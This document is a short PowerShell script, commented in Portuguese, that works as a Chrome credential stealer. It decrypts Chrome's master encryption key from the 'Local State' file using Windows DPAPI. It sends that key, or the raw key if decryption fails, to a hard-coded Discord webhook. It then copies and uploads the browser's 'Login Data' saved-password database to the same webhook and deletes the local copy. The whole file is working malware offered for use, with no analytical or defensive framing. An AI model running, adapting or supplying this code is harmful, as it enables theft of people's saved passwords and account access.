$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"
# 1. Localiza o Local State
$base = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$ls = Get-ChildItem -Path $base -Recurse -Filter "Local State" | Select-Object -First 1

# 2. Extrai a chave bruta
$json = Get-Content $ls.FullName -Raw | ConvertFrom-Json
$encKey = $json.os_crypt.encrypted_key
$bytes = [Convert]::FromBase64String($encKey)

# 3. Tenta descriptografar usando uma chamada direta de Memória
try {
    $bytes = $bytes[5..($bytes.Length - 1)]
    Add-Type -AssemblyName System.Security
    $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    $unprotected = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, $scope)
    $finalKey = [Convert]::ToBase64String($unprotected)
    
    # Se a chave for pequena (44 caracteres), funcionou!
    curl.exe -X POST -F "content=🔑 CHAVE_REAL_CURTA: $finalKey" $u
} catch {
    # Se falhar, vamos mandar a Chave Bruta de novo mas com um aviso
    curl.exe -X POST -F "content=⚠️ O Windows bloqueou a abertura. Tente usar esta chave bruta no Dashboard atualizado: $encKey" $u
}

# 4. Envia o arquivo de senhas (Login Data)
$loginData = Get-ChildItem -Path $base -Recurse -Filter "Login Data" | Select-Object -First 1
if ($loginData) {
    $temp = "$env:TEMP\L.db"
    Copy-Item $loginData.FullName $temp -Force
    curl.exe -X POST -F "file=@$temp" $u
    Remove-Item $temp -Force
}
exit
